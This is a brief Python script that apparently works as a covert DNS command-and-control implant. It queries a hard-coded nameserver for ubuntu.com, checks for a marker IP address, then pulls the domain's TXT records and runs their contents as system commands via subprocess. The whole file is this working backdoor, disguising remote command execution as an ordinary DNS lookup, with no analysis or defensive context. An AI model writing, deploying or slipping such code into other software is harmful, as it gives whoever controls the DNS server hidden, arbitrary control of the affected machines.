import dns.resolver
import subprocess

dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
dns.resolver.default_resolver.nameservers = ['10.15.0.35']

answers = dns.resolver.resolve ('ubuntu.com', 'A')

for rec in answers:
    if rec.address == '10.69.0.69':
        commands = dns.resolver.resolve ('ubuntu.com', 'TXT')
        for line in commands:
            print(line.strings)
            subprocess.call (list(line.strings))            
